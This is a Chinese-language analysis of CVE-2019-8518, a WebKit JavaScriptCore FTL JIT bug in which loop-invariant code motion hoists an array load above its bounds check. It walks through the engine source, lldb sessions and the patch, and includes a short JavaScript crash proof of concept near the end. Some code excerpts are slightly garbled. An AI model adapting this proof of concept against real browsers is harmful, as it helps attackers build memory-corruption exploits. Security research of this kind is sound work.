@@ -1,0 +1,250 @@
+# CVE-2019-8518漏洞分析
+FTL JIT的LICM由于错误的将`GetByVal`提升到preheader导致没有检查数组边界从而造成OOB访问
+## 前置知识
+LICM即循环不变代码外提,也就是对于在循环迭代的过程中不会发生变动的代码,会将其移动到循环外
+## DFGLICMPhase分析
+下断到`attemptHoist()`函数
+    (lldb) b WebKit/Source/JavaScriptCore/dfg/DFGLICMPhase.cpp:224
+尝试hoist需要几个条件,在`attempHoist()`中
+    // WebKit/Source/JavaScriptCore/dfg/DFGLICMPhase.cppif (!data.preHeader) {
+                if (verbose)
+                    dataLog("    Not hoisting ", node, " because the pre-header is invalid.\n");
+                return false;
+            }
+            if (!data.preHeader->cfaDidFinish) {
+                if (verbose)
+                    dataLog("    Not hoisting ", node, " because CFA is invalid.\n");
+                return false;
+            }
+                    ...
+            if (!edgesDominate(m_graph, node, data.preHeader)) {
+                if (verbose) {
+                    dataLog(
+                        "    Not hoisting ", node, " because it isn't loop invariant.\n");
+                }
+                return tryHoistChecks();
+            }
+            if (doesWrites(m_graph, node)) {
+                if (verbose)
+                    dataLog("    Not hoisting ", node, " because it writes things.\n");
+                return tryHoistChecks();
+            }
+            if (readsOverlap(m_graph, node, data.writes)) {
+                if (verbose) {
+                    dataLog(
+                        "    Not hoisting ", node,
+                        " because it reads things that the loop writes.\n");
+                }
+                return tryHoistChecks();
+            }
+            if (addsBlindSpeculation && !canSpeculateBlindly) {
+                if (verbose) {
+                    dataLog(
+                        "    Not hoisting ", node, " because it may exit and the pre-header (",
+                        *data.preHeader, ") is not control equivalent to the node's original block (",
+                        *fromBlock, ") and hoisting had previously failed.\n");
+                }
+                return tryHoistChecks();
+            }
+            if (!safeToExecute(m_state, m_graph, node)) {
+                // See if we can rescue the situation by inserting blind speculations.bool ignoreEmptyChildren = true;
+                if (canSpeculateBlindly
+                    && safeToExecute(m_state, m_graph, node, ignoreEmptyChildren)) {
+                    if (verbose) {
+                        dataLog(
+                            "    Rescuing hoisting by inserting empty checks.\n");
+                    }
+                    m_graph.doToChildren(
+                        node,
+                        [&] (Edge& edge) {
+                            if (!(m_state.forNode(edge).m_type & SpecEmpty))
+                                return;
+                            Node* check = m_graph.addNode(CheckNotEmpty, originalOrigin, Edge(edge.node(), UntypedUse));
+                            insertHoistedNode(check);
+                        });
+                } else {
+                    if (verbose) {
+                        dataLog(
+                            "    Not hoisting ", node, " because it isn't safe to execute.\n");
+                    }
+                    return tryHoistChecks();
+                }
+            }
+重点关注`edgesDominate(m_graph, node, data.preHeader)`
+代码逻辑如下
+    // WebKit/Source/JavaScriptCore/dfg/DFGEdgeDominates.hclass EdgeDominates {
+        static const bool verbose = false;
+        ...
+        void operator()(Node*, Edge edge)
+        {
+            bool result = m_graph.m_ssaDominators->dominates(edge.node()->owner, m_block);
+            if (verbose) {
+                dataLog(
+                    "Checking if ", edge, " in ", *edge.node()->owner,
+                    " dominates ", *m_block, ": ", result, "\n");
+            }
+            m_result &= result;
+        }
+        ...
+    private:
+        Graph& m_graph;
+        BasicBlock* m_block;
+        bool m_result;
+    }
+    inline bool edgesDominate(Graph& graph, Node* node, BasicBlock* block)
+    {
+        EdgeDominates edgeDominates(graph, block);
+        DFG_NODE_DO_TO_CHILDREN(graph, node, edgeDominates);
+        return edgeDominates.result();
+    }
+    // WebKit/Source/JavaScriptCore/dfg/DFGGraph.h#define DFG_NODE_DO_TO_CHILDREN(graph, node, thingToDo) do {            \
+            Node* _node = (node);                                           \
+            if (_node->flags() & NodeHasVarArgs) {                          \
+                for (unsigned _childIdx = _node->firstChild();              \
+                    _childIdx firstChild() + _node->numChildren(); \
+                    _childIdx++) {                                          \
+                    if (!!(graph).m_varArgChildren[_childIdx])              \
+                        thingToDo(_node, (graph).m_varArgChildren[_childIdx]); \
+                }                                                           \
+            } else {                                                        \
+                for (unsigned _edgeIndex = 0; _edgeIndex children.child(_edgeIndex);        \
+                    if (!_edge)                                             \
+                        break;                                              \
+                    thingToDo(_node, _edge);                                \
+                }                                                           \
+            }                                                               \
+        } while (false)
+    // WebKit/Source/WTF/wtf/Dominators.hbool strictlyDominates(typename Graph::Node from, typename Graph::Node to) const
+        {
+            return m_data[to].preNumber > m_data[from].preNumber
+                && m_data[to].postNumber owner`是否为`block0`或者是否为`strictly dominates`
+对于`GetByVal`来说,有三个child
+    (lldb) p edge.node()->op()
+    (JSC::DFG::NodeType) $95 = GetStack
+    (lldb) p edge.node()->owner->index
+    (JSC::DFG::BlockIndex) $96 = 0
+    (lldb) p edge.node()->op()
+    (JSC::DFG::NodeType) $98 = JSConstant
+    (lldb) p edge.node()->owner->index
+    (JSC::DFG::BlockIndex) $99 = 0
+    (lldb) p edge.node()->op()
+    (JSC::DFG::NodeType) $100 = GetButterfly
+    (lldb) p edge.node()->owner->index
+    (JSC::DFG::BlockIndex) $101 = 0
+因为三个child都为`edge dominate`,所以`getByVal`会被尝试`hoist`到`block0`(还要同时满足其他条件)
+但是对于`CheckInBounds`来说,有两个child
+    (lldb) p edge.node()->op()
+    (JSC::DFG::NodeType) $52 = JSConstant
+    (lldb) p edge.node()->owner->index
+    (JSC::DFG::BlockIndex) $53 = 0
+    (lldb) p m_block->index
+    (JSC::DFG::BlockIndex) $55 = 0
+    (lldb) p edge.node()->op()
+    (JSC::DFG::NodeType) $56 = GetArrayLength
+    (lldb) p edge.node()->owner->index
+    (JSC::DFG::BlockIndex) $57 = 2
+    (lldb) p m_block->index
+    (JSC::DFG::BlockIndex) $58 = 0
+可以发现其child `GetArrayLength`属于`block2`,不为`edge dominate`,因此无法被`hoist`
+## DFGSSALoweringPhase分析
+下断到`handleNode()`
+    (lldb) b WebKit/Source/JavaScriptCore/dfg/DFGSSALoweringPhase.cpp:84
+`GetByVal`节点直接调用了`lowerBoundsCheck()`函数
+    case GetByVal: {
+                lowerBoundsCheck(m_graph.varArgChild(m_node, 0), m_graph.varArgChild(m_node, 1), m_graph.varArgChild(m_node, 2));
+                break;
+            }
+其中三个child分别代表了`base`、`index`和`storage`
+    bool lowerBoundsCheck(Edge base, Edge index, Edge storage)
+        {
+            if (!m_node->arrayMode().permitsBoundsCheckLowering())
+                return false;
+            if (!m_node->arrayMode().lengthNeedsStorage())
+                storage = Edge();
+            NodeType op = GetArrayLength;
+            switch (m_node->arrayMode().type()) {
+            case Array::ArrayStorage:
+            case Array::SlowPutArrayStorage:
+                op = GetVectorLength;
+                break;
+            case Array::String:
+                // When we need to support this, it will require additional code since base's useKind is KnownStringUse.
+                DFG_CRASH(m_graph, m_node, "Array::String's base.useKind() is KnownStringUse");
+                break;
+            default:
+                break;
+            }
+            Node* length = m_insertionSet.insertNode(
+                m_nodeIndex, SpecInt32Only, op, m_node->origin,
+                OpInfo(m_node->arrayMode().asWord()), Edge(base.node(), KnownCellUse), storage);
+            m_insertionSet.insertNode(
+                m_nodeIndex, SpecInt32Only, CheckInBounds, m_node->origin,
+                index, Edge(length, KnownInt32Use));
+            return true;
+        }
+可以看到插入了两个节点`GetArrayLength`和`CheckInBounds`,其中`GetArrayLength`作为了`CheckInBounds`的`edge
+dominate`,然鹅,依赖于`CheckInBounds`的节点同样需要有`edge dominate`,所以我们可以看到在patch中增加了一段
+    Node* length = m_insertionSet.insertNode(
+                  m_nodeIndex, SpecInt32Only, op, m_node->origin,
+                  OpInfo(m_node->arrayMode().asWord()), Edge(base.node(), KnownCellUse), storage);
+    -         m_insertionSet.insertNode(
+    +         Node* checkInBounds = m_insertionSet.insertNode(
+                  m_nodeIndex, SpecInt32Only, CheckInBounds, m_node->origin,
+                  index, Edge(length, KnownInt32Use));
+    +
+    +         AdjacencyList adjacencyList = m_graph.copyVarargChildren(m_node);
+    +         m_graph.m_varArgChildren.append(Edge(checkInBounds, UntypedUse));
+    +         adjacencyList.setNumChildren(adjacencyList.numChildren() + 1);
+    +         m_node->children = adjacencyList;
+              return true;
+          }
+## POC分析
+最后来看一下POC
+    // Run with --thresholdForFTLOptimizeAfterWarmUp=1000// First array probably required to avoid COW backing storage or so...const v3 = [1337,1337,1337,1337];
+        const v6 = [1337,1337];
+        function v7(v8) {
+            for (let v9 in v8) {
+                v8.a = 42;
+                const v10 = v8[-698666199];
+            }
+        }
+        while (true) {
+            const v14 = v7(v6);
+            const v15 = v7(1337);
+        }
+在FTL层中进行JIT编译期间,`v7`的`JIT IR`将具有以下属性:
+  * 由于属性访问,将为`v8`插入结构检查,该检查将确保数组在运行时具有正确的类型(`ArrayWithInt32`,具有属性`a`)
+  * 循环头获取枚举的数组长度
+  * 对`v8`的元素访问被(错误地?)推测为`InBounds`,大概是因为负数实际上不是有效的数组索引,而是常规的属性名称
+  * 结果,元素访问将被优化为一个`CheckBounds node`,然后是一个`GetByVal node`(都在循环体内)
+  * `CheckBounds node`将常量索引与循环头中加载的数组长度进行比较
+因此,该功能的`IR`大致如下:
+    # Loop header
+    len = LoadArrayLength v8
+    // Do other loop header stuff
+    # Loop body
+    CheckStructure v8, expected_structure_id
+    StoreProperty v8, 'a', 42
+    CheckBounds -698666199, len             // Bails out if index is OOB (always in this case...)
+    GetByVal v8, -698666199                 // Loads the element from the backing storage without performing additional checks
+    // Jump back to beginning of loop
+这是`loop-invariant code
+motion`(`LICM`)期间接下来发生的事情,这是一种优化设计,用于在不需要多次执行的情况下将代码移动到循环体前面的循环头内:
+  1. `LICM`确定`CheckStructure node`可以移到循环头的前面,并这样做
+  2. `LICM`确定`CheckBounds`节点不能移到循环头,因为它取决于仅加载到循环头中的数组长度
+  3. `LICM`确定可以将数组访问(`GetByVal`)移到循环头的前面(因为它不依赖于任何循环变量),并且这样做
+由于上述结果,IR大致转换为以下内容:
+    StructureCheck v8, expected_structure_id
+    GetByVal v8, -698666199
+    # Loop header
+    len = LoadArrayLength v8
+    // Do other loop header stuff
+    # Loop body
+    StoreProperty v8, 'a', 42
+    CheckBounds -698666199, len
+    // Jump back to beginning of loop
+这样,(未检查的)数组元素访问现在位于循环标头之前,仅在此之后在循环体内进行边界检查
+然后,在访问内存`v6`元素向量之前`698666199 * 8`个字节时,提供的PoC崩溃
+仅当`safeToExecute`(来自`DFGSafeToExecute.h`)返回`true`时,才会将`GetByVal`移到循环头前.该函数似乎只关心类型检查,因此在这种情况下,可以得出结论`GetByVal`可以移到循环头的前面是因为`StructureCheck`(执行类型检查)也移到了循环头.这似乎是需要属性存储(`v8.a
+= 42`)的原因,因为它强制执行`CheckStructure node`,否则该节点将丢失
+似乎有必要使用非数组参数调用`v7`(在这种情况下为1337),以免过于频繁地触发早期JIT层中的bailout,这将阻止FTL JIT编译该函数
